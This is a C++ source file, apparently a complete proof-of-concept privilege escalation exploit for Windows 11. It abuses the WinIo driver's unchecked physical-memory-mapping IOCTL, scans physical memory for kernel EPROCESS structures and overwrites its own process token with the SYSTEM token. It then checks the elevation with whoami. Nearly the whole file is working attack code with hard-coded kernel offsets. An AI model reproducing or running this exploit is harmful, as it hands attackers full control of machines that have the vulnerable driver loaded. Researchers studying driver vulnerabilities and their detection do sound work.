#include <iostream>
#include <Windows.h>
#include <cstdint>

#define IOCTL_MAP_PHYS_MEM 0x80102040
#define IOCTL_UNMAP_PHYS_MEM 0x80102044

#define PHYSICAL_READ_BASE 0xFC000800

#define FOUR_GB       (4ULL * 1024 * 1024 * 1024)
#define EIGHT_GB      (FOUR_GB * 2)
#define SIXTEEN_GB    (EIGHT_GB * 2)
#define THIRTY_TWO_GB (SIXTEEN_GB * 2)

// EPROCESS offsets - Windows 11 25H2 - ***may need to be updated***
#define EPROCESS_UNIQUEPID_OFFSET          0x1D0
#define EPROCESS_ACTIVELINKS_OFFSET        0x1D8
#define EPROCESS_CREATETIME_OFFSET         0x1F8
#define EPROCESS_TOKEN_OFFSET              0x248
#define EPROCESS_BASEADDRESS_OFFSET        0x2B0
#define EPROCESS_PEB_OFFSET                0x2E0
#define EPROCESS_OBJECTTABLE_OFFSET        0x300
#define EPROCESS_IMAGEFILENAME_OFFSET      0x338
#define EPROCESS_THREADLISTHEAD_OFFSET     0x370
#define EPROCESS_EXITTIME_OFFSET           0x5C0
#define KPROCESS_DIRECTORYTABLEBASE_OFFSET 0x028

#define TIMESTAMP_MIN 130645056000000000
#define TIMESTAMP_MAX 160000000000000000

#pragma pack(push, 1)
struct map_request
{
    DWORD64 size;
    DWORD64 phys_addr;
    HANDLE section_handle;
    DWORD64 section_base_va;
    PVOID section_object_ptr;
};
#pragma pack(pop)

struct process
{
    DWORD64 eprocess_phys;
    DWORD64 eprocess_va;
    DWORD64 token;
    DWORD64 pid;
};

template <typename T>
T read(DWORD64 address)
{
    __try
    {
        return *(volatile T*)address;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return 0;
    }
}

template <typename T>
bool write(DWORD64 address, T& value)
{
    __try
    {
        *(volatile T*)address = value;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
}

void print_process_name(DWORD64 address)
{
    char name_buffer[16]{};
    for (size_t i = 0; i < 15; ++i)
    {
        char c = read<char>(address + i);
        if (c == 0)
            break;
        if (c >= 32 && c <= 126)
            name_buffer[i] = c;
        else
            name_buffer[i] = '.';
    }
    std::cout << "Name: " << name_buffer << " ";
}

int main()
{
    HANDLE driver_handle = CreateFileW(L"\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, 3, nullptr, 3, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (driver_handle == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Failed to grab driver handle.\n";
        std::cout << "[*] Press enter to exit.\n";
        std::cin.get();
        return 1;
    }

    std::cout << "[+] Grabbed driver handle.\n\n";

    process current_proc{};
    current_proc.pid = GetCurrentProcessId();

    process system_proc{};

    bool found_system = false;
    bool found_target = false;

    ULONGLONG total_ram_kb = 0;
    DWORD64 map_size = EIGHT_GB;

    if (GetPhysicallyInstalledSystemMemory(&total_ram_kb))
    {
        map_size = total_ram_kb * 1024;
        std::cout << "[*] Physical RAM: " << std::dec << (total_ram_kb / (1024 * 1024)) << " GB (0x" << std::hex << map_size << " bytes)\n";
    }
    else
    {
        std::cout << "[-] Failed to get physical RAM size. Defaulting 8 GB.\n";
    }

    map_request read_req{};
    read_req.size = map_size - PHYSICAL_READ_BASE; // ZwMapViewOfSection argument 7. no checks in the driver. can be used to map entire physical memory
    read_req.phys_addr = PHYSICAL_READ_BASE; // lowest address in driver bound check

    std::cout << "[*] Requesting memory map.\n";
    DWORD bytes = 0;
    if (DeviceIoControl(driver_handle, IOCTL_MAP_PHYS_MEM, &read_req, sizeof(map_request), &read_req, sizeof(map_request), &bytes, NULL))
    {
        DWORD64 map_base_va = read_req.section_base_va;
        if (map_base_va)
        {
            std::cout << "[+] Map base VA found at 0x" << std::hex << map_base_va << ". Starting physical memory walk.\n\n";

            int found_count = 0;

            DWORD64 end_offset = map_size - PHYSICAL_READ_BASE;

            for (DWORD64 offset = 0; offset < end_offset; offset += 8) // physical memory walk
            {
                DWORD64 current_mapped_va = map_base_va + offset;

                __try
                {
                    DWORD64 pid = *(volatile DWORD64*)current_mapped_va;
                    if (pid >= 4 && pid <= 0xA0000 && (pid % 4 == 0)) // check if pid is valid and multiple of 4
                    {
                        DWORD64 eprocess_base = current_mapped_va - EPROCESS_UNIQUEPID_OFFSET;

                        DWORD64 exit_time = read<DWORD64>(eprocess_base + EPROCESS_EXITTIME_OFFSET);
                        if (exit_time)
                            continue; // if ExitTime != 0, the process has been terminated

                        DWORD64 create_time = read<DWORD64>(eprocess_base + EPROCESS_CREATETIME_OFFSET);
                        if (create_time < TIMESTAMP_MIN || create_time > TIMESTAMP_MAX)
                            continue; // check if CreateTime isn't in valid bounds
                        
                        DWORD64 flink = read<DWORD64>(eprocess_base + EPROCESS_ACTIVELINKS_OFFSET);
                        if ((flink & 0xFFFF000000000000) != 0xFFFF000000000000)
                            continue; // check if next list entry is not in valid kernel address space

                        DWORD64 token = read<DWORD64>(eprocess_base + EPROCESS_TOKEN_OFFSET);
                        if ((token & 0xFFFF000000000000) != 0xFFFF000000000000)
                            continue; // check if token is not in valid kernel address space

                        DWORD64 dir_base = read<DWORD64>(eprocess_base + KPROCESS_DIRECTORYTABLEBASE_OFFSET);
                        if (dir_base == 0 || (dir_base & 0xFFF) != 0 || (dir_base & 0xFFFF000000000000) != 0)
                            continue; // check if cr3 is valid

                        char first_char = read<char>(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
                        if (first_char < 32 || first_char > 126)
                            continue; // check if ImageFileName is valid

                        // passed validation checks, found eprocess
                        found_count++;
                        DWORD64 eprocess_phys_address = (PHYSICAL_READ_BASE + offset) - EPROCESS_UNIQUEPID_OFFSET;
                        DWORD64 process_virtual_base = read<DWORD64>(eprocess_base + EPROCESS_BASEADDRESS_OFFSET);

                        std::cout << "[*] PID: " << std::dec << pid << " ";
                        print_process_name(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
                        std::cout << "EPROCESS Phys: 0x" << std::hex << eprocess_phys_address << " ";
                        std::cout << "Base VA: 0x" << std::hex << process_virtual_base;
                        std::cout << "\n";

                        if (pid == current_proc.pid && !found_target)
                        {
                            current_proc.eprocess_phys = eprocess_phys_address;
                            current_proc.eprocess_va = eprocess_base;
                            current_proc.token = token;
                            found_target = true;
                        }

                        if (pid == 4 && !found_system)
                        {
                            system_proc.eprocess_phys = eprocess_phys_address;
                            system_proc.eprocess_va = eprocess_base;
                            system_proc.token = token;
                            found_system = true;
                        }
                    }
                }
                __except (EXCEPTION_EXECUTE_HANDLER) // ***this will give exceptions. they must be ignored or the process should be launched without a debugger***
                {
                    // jump to next page if we hit a hole
                    offset = (offset & ~0xFFFULL) + 0x1000 - 8;
                }
            }
            std::cout << "[+] Completed physical memory walk. Found " << std::dec << found_count << " processes.\n\n";

        }
        else
        {
            std::cout << "[-] Map base VA not found.\n";
        }
    }
    else
    {
        std::cout << "[-] Failed to retrieve map base VA.\n";
        std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
        CloseHandle(driver_handle);
        std::cin.get();
        return 1;
    }

    if (!found_system)
    {
        std::cout << "[-] System process not found.\n";
        std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
        CloseHandle(driver_handle);
        std::cin.get();
        return 1;
    }

    if (!found_target)
    {
        std::cout << "[-] Current process not found. Try again.\n";
        std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
        CloseHandle(driver_handle);
        std::cin.get();
        return 1;
    }

    std::cout << "[*] Current privilege: ";
    system("cmd.exe /c whoami");
    std::cout << "[*] Current process token: " << std::hex << current_proc.token << "\n\n";

    std::cout << "[*] System token: " << std::hex << system_proc.token << "\n";
    std::cout << "[*] Stealing system token...\n\n";

    if (write<DWORD64>(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET, system_proc.token))
    {
        DWORD64 verify = read<DWORD64>(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET);
        if (verify == system_proc.token)
        {
            std::cout << "[+] System token is stolen.\n";
            std::cout << "[*] New process token: " << std::hex << verify << "\n";
        }
        else
        {
            std::cout << "[-] Token stealing failed.\n";
            CloseHandle(driver_handle);
            std::cin.get();
            return 1;
        }
    }

    std::cout << "[*] New privilege: ";
    system("cmd.exe /c whoami");

    CloseHandle(driver_handle);

    std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";

    std::cin.get();
    return 0;
}
